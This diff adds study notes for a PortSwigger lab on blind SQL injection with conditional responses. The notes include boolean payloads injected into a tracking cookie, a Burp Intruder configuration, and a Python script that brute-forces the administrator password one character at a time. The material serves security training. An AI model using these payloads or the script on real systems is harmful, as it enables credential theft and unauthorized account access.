@@ -1,0 +1,169 @@
+
+### **Lab Notes: Blind SQL Injection with Conditional Responses**
+
+---
+
+#### **Lab URL**:  
+[https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+
+---
+
+### **High-Level Summary**
+
+1. **Objective**: Exploit a **_blind SQL injection vulnerability_** in the `TrackingId` cookie to extract the administrator's password and log in as the administrator to complete the lab.
+
+2. **Key Techniques**:
+   - Use **_boolean-based blind SQL injection_** to determine true/false conditions.
+   - Test for valid conditions using **manual testing**.
+   - Automate character-by-character password extraction using **Burp Intruder** or a custom Python script.
+
+3. **Key Learnings**:
+   - SQL Injection can exploit hidden fields such as cookies, headers, or User-Agent strings.
+   - Automation is crucial when brute-forcing blind SQL conditions for efficiency.
+
+---
+
+### **PortSwigger Solution**
+
+1. Use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.  
+   Example request:
+   ```plaintext
+   GET /filter?category=Pets HTTP/2
+   Host: <lab-url>.web-security-academy.net
+   Cookie: TrackingId=xyz; session=<session-id>
+   ```
+
+2. Modify the `TrackingId` cookie to test a true condition:  
+   ```plaintext
+   TrackingId=xyz' AND '1'='1
+   ```  
+   Verify the **Welcome back** message appears.
+
+3. Test a false condition:  
+   ```plaintext
+   TrackingId=xyz' AND '1'='2
+   ```  
+   Verify the **Welcome back** message disappears.
+
+4. Confirm the `users` table exists:  
+   ```plaintext
+   TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+   ```  
+   Check if the condition is true.
+
+5. Check if the `administrator` user exists:  
+   ```plaintext
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+   ```  
+   Confirm the condition is true.
+
+6. Determine the password length:  
+   Use the following payloads incrementally:  
+   ```plaintext
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+   ```  
+   Stop when the condition is false. (Password length: **20** characters)
+
+7. Extract each password character using the `SUBSTRING` function:  
+   ```plaintext
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+   ```
+
+8. Use **Burp Intruder**:  
+   - Set payload markers around the position and character.  
+   - Payload set 1: Numbers (1-20 for position)  
+   - Payload set 2: Characters (`a-z`, `0-9`)  
+   - Grep for **Welcome back** in the response to find valid characters.
+
+9. Log in as the administrator using the retrieved credentials.
+
+---
+
+### **Instructor Notes**
+
+#### **Manual Testing**
+1. Intercept the request in Burp Suite.  
+2. Test SQL injection manually by modifying the `TrackingId` cookie:  
+   - True condition:  
+     ```plaintext
+     TrackingId=xyz' AND '1'='1
+     ```  
+   - False condition:  
+     ```plaintext
+     TrackingId=xyz' AND '1'='2
+     ```  
+
+3. Observe response differences:  
+   - True: Includes **Welcome back** message.  
+   - False: Message not displayed.
+
+#### **Automating with Intruder**
+1. Send the modified request to **Intruder**.  
+2. Add positional markers for the `SUBSTRING` function.  
+3. Configure payload sets:  
+   - Payload set 1: Numbers (1-20 for password positions).  
+   - Payload set 2: Characters (`a-z`, `0-9`).  
+
+4. Grep responses for **Welcome back** to identify valid characters.
+
+---
+
+### **Python Script for Automation**
+
+```python
+import requests
+import string
+
+# Target URL and cookies
+burp0_url = "https://<lab-url>.web-security-academy.net/filter?category=Pets"
+burp0_cookies = {"TrackingId": "xyz", "session": "<session-id>"}
+char_set = string.ascii_lowercase + string.digits  # a-z, 0-9
+password = ''
+
+# Brute-force password extraction
+for position in range(1, 21):
+    for char in char_set:
+        burp0_cookies["TrackingId"] = f"xyz' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
+        response = requests.get(burp0_url, cookies=burp0_cookies)
+        if "Welcome back" in response.text:
+            password += char
+            print(f"Found character: {char} at position {position}")
+            break
+
+print(f"Password: {password}")
+```
+
+---
+
+### **What is Substring?**
+The `SUBSTRING` function extracts part of a string.  
+- **Example**:  
+  ```plaintext
+  SUBSTRING('foobar', 4, 2)  -->  'ba'
+  ```
+
+### **Key SQL Injection Payloads**
+1. Determine if table exists:  
+   ```plaintext
+   TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+   ```
+
+2. Extract password length:  
+   ```plaintext
+   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a
+   ```
+
+3. Extract characters:  
+   ```plaintext
+   TrackingId=xyz' AND (SELECT SUBSTRING(password,P,1) FROM users WHERE username='administrator')='C
+   ```
+   - `P`: Position in password.  
+   - `C`: Character being tested.
+
+---
+
+### **Key Takeaways**
+- **Blind SQL Injection** can be exploited by observing subtle application behaviors.
+- Combining manual testing with automation tools (Burp Intruder, Python scripts) streamlines the process.
+- Use boolean conditions (`=`, `>`, `<`) to efficiently narrow down password characters.
